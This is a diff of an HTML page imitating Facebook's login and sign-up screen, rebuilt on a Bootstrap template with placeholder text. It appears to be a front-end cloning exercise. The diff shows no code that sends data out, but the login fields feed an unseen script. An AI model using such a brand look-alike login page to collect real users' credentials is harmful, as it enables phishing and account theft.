@@ -5,126 +5,141 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
-    <link rel="stylesheet" href="styles/main.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha256-YLGeXaapI0/5IgZopewRJcFXomhRMlYYjugPLSyNjTY=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="styles/main2.css">
 </head>
 
 <body>
 
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
-
-    <div id="navwrapper">
-        <div id="navbar">
-            <table class="tablewrapper">
-                <tr>
-                    <td class="row1">Email or Phone</td>
-                    <td class="row1">Password</td>
-                </tr>
-                <tr>
-                    <td><input type="text" class="inputtext" id="email">
-                    </td>
-                    <td><input type="password" class="inputtext" id="password">
-                    </td>
-                    <td>
-                        <div id="button">Log In</div>
-                    </td>
-                </tr>
-                <tr>
-                    <td>
-                        <div class="row2"><input type="checkbox" checked>Keep me logged in</div>
-                    </td>
-                    <td class="row2 h">Forgot your password?</td>
-            </table>
-
-            <h1 class="logowrapper">facebook</h1>
-
-        </div>
-    </div>
-
-    <div id="contentwrapper">
-        <div id="content">
-
-            <div id="leftbod">
-
-                <div class="connect bolder">
-                    Connect with friends and the
-                    world around you on Facebook.</div>
-
-                <div class="leftbar">
-                    <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851565_602269956474188_918638970_n.png" alt="" class="iconwrap fb1" />
-                    <div class="fb1">
-                        <span class="rowtext">See photos and updates</span>
-                        <span class="rowtext2 fb1">from friends in News Feed</span>
-                    </div>
+    <header>
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-6">
+                    <div class="fblogo">facebook</div>
                 </div>
-
-                <div class="leftbar">
-                    <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851585_216271631855613_2121533625_n.png" alt="" class="iconwrap fb1" />
-                    <div class="fb1">
-                        <span class="rowtext">Share what's new</span>
-                        <span class="rowtext2 fb1">in your life on your timeline</span>
-                    </div>
-                </div>
-
-                <div class="leftbar">
-                    <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851558_160351450817973_1678868765_n.png " alt="" class="iconwrap fb1" />
-                    <div class="fb1">
-                        <span class="rowtext">Find more</span>
-                        <span class="rowtext2 fb1">of what you're looking for with graph search</span>
-                    </div>
-                </div>
-
-
-            </div>
-
-            <div id="rightbod">
-                <div class="signup bolder">Sign Up</div>
-                <div class="free bolder">It's free and always will be</div>
-
-                <div class="formbox">
-                    <input type="text" class="inputbody in1" placeholder="First name">
-                    <input type="text" class="inputbody in1 fr" placeholder="Last name">
-                </div>
-                <div class="formbox">
-                    <input type="text" class="inputbody in2" placeholder="Email or mobile number">
-                </div>
-                <div class="formbox">
-                    <input type="text" class="inputbody in2" placeholder="Re-enter email or mobile number">
-                </div>
-                <div class="formbox">
-                    <input type="text" class="inputbody in2" placeholder="New password">
-                </div>
-                <div class="formbox">
-                    <div class="bday">Birthday</div>
-                </div>
-
-                <div class="formbox mt1">
-                    <span data-type="radio" class="spanpad">
-                        <input type="radio" id="fem" class="m0">
-                        <label for="fem" class="gender">Female
-                        </label>
-                        <input type="radio" id="male" class="m0">
-                        <label for="male" class="gender">Male
-                        </label>
-                    </span>
-                </div>
-                <div class="formbox">
-                    <div class="agree">
-                        By clicking Sign Up, you agree to our <div class="link">Terms</div> and that you have read our <div class="link">Data Use Policy</div>, including our <div class="link">Cookie Use</div>.
-                    </div>
-                </div>
-                <div class="formbox">
-                    <button type="submit" class="signbut bolder">Sign Up</button>
-                </div>
-                <div class="formbox">
-                    <div class="create">
-                        <div class="link h">Create a Page</div> for a celebrity, band or business.
+                <div class="col-sm-6 hidden-xs">
+                    <div class="row">
+                        <div class="col-sm-5">
+                            <div class="form-group">
+                                <input type="text" class="form-control" placeholder="Email Address" id="email">
+                                <div class="login-bottom-text checkbox hidden-sm">
+                                    <label>
+                                        <input type="checkbox" id="">
+                                        Keep me sign in
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-sm-5">
+                            <div class="form-group">
+                                <input type="password" class="form-control" placeholder="Password" id="password">
+                                <div class="login-bottom-text hidden-sm"> Forgot your password? </div>
+                            </div>
+                        </div>
+                        <div class="col-sm-2">
+                            <div class="form-group">
+                                <input type="button" value="login" class="btn btn-light btn-header-login" id="button">
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
+    </header>
+    <article class="container">
+        <div class="row">
+            <div class="col-sm-8">
+                <div class="login-main">
+                    <h4><i class="fa fa-dashboard"></i> Gorgeous color and design</h4>
+                    <span>Some sample description text about the template goes here</span>
 
+                    <h4> <i class="fa fa-money"></i> 100% fully responsive </h4>
+                    <span>Another description text about the template goes here</span>
+
+                    <h4><i class="fa fa-mobile-phone"></i> Competible with all browers and mobile devices</h4>
+                    <span>Yet another sample description text can be placed in one line</span>
+
+                    <h4> <i class="fa fa-trophy"></i> Easy to use and custmize with mobile friendly and responsive</h4>
+                    <span>Your last description text about your startup or business</span>
+                </div>
+            </div>
+            <div class="col-sm-4">
+                <div class="">
+
+                    <h3><i class="fa fa-shield"></i> Register now</h3>
+                    <hr>
+                    <div class="form-group">
+                        <label class="control-label" for="">Email Address</label>
+                        <input type="text" class="form-control" placeholder="Email Address">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="control-label" for="">Password</label>
+                        <input type="text" class="form-control" placeholder="Password">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="control-label" for="">Repeat Password</label>
+                        <input type="text" class="form-control" placeholder="Repeat Password">
+                    </div>
+
+                    <div class="">
+                        <label>Birthday</label>
+                        <div class="form-group">
+                            <div class="col-sm-4 multibox">
+                                <select class="form-control">
+                                    <option>Day</option>
+                                </select>
+                            </div>
+                            <div class="col-sm-4 multibox">
+                                <select class="form-control">
+                                    <option>Month</option>
+                                </select>
+                            </div>
+                            <div class="col-sm-4 multibox">
+                                <select class="form-control">
+                                    <option>Year</option>
+                                </select>
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <small>
+                        By clicking Sign Up, you agree to our Terms and that you have read our
+                        Data Use Policy, including our Cookie Use.
+                    </small>
+                    <div style="height:10px;"></div>
+                    <div class="form-group">
+                        <label class="control-label" for=""></label>
+                        <input type="submit" class="btn btn-primary">
+                    </div>
+
+                </div>
+            </div>
+        </div>
+        </div>
+    </article>
+    <footer class="container">
+        <hr>
+        <div class="footer-options">
+            <ul>
+                <li><a href="#">Mobile</li>
+                <li><a href="#">Find Friends</li>
+                <li><a href="#">Badges</li>
+                <li><a href="#">People</li>
+                <li><a href="#">Pages</li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">About</a></li>
+            </ul>
+        </div>
+        <div style="clear:both"></div>
+        <small class="copyrights"> © Copyrights reserved 2014</small>
+    </footer>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha256-CjSoeELFOcH0/uxWu6mC/Vlrc1AARqbm/jiiImDGV3s=" crossorigin="anonymous"></script>
     <script src="scripts/main.js"></script>
 </body>
 
